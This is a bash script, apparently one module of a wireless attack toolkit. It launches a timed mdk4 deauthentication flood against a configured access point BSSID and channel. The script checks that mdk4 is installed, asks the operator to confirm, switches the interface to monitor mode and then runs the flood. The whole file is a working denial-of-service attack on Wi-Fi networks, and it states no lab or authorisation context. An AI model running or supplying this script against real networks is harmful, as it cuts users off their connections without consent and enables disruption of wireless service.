#!/bin/bash
# Utility: Deauth Flood using mdk4
# 
# Description:
#   Launches a targeted deauthentication flood using mdk4 against a specified BSSID.
#
# Requirements:
#   - mdk4 must be installed and in PATH
#   - Must be run with sudo/root privileges
#   - Interface must support monitor mode (automatically handled)
#
# Usage:
#   ./run_mdk4_deauth.sh
#
# Inputs:
#   - Wireless interface (e.g. wlan0)
#   - Target BSSID (e.g. AA:BB:CC:DD:EE:FF)
#   - Attack duration in seconds (optional; defaults to config value)
#
# Example:
#   ./run_mdk4_deauth.sh
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Resets MAC address to hardware default before launch
#   - Forms the basis for T007

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
UTILITIES_DIR="$BASH_DIR/utilities"
SERVICES_DIR="$BASH_DIR/services"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/atk_mdk4_deauth.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_cleanup.sh"

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$ATK_BSSID" || -z "$ATK_CHANNEL" ]]; then
    print_warn "INTERFACE, ATK_BSSID, or ATK_CHANNEL not defined in atk_mdk4_deauth.conf"
    exit 1
fi

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 1
fi

# Display config
echo "Mode         : T007 - Deauthentication Flood"
echo "Interface    : $INTERFACE"
echo "Target BSSID : $ATK_BSSID"
echo "Channel      : $ATK_CHANNEL"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T007" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Set monitor mode
ensure_monitor_mode

# Run attack
print_blank
print_info "Running T007 - Deauthentication Flood attack for $DURATION seconds"
sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$ATK_BSSID" -c "$ATK_CHANNEL"
EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0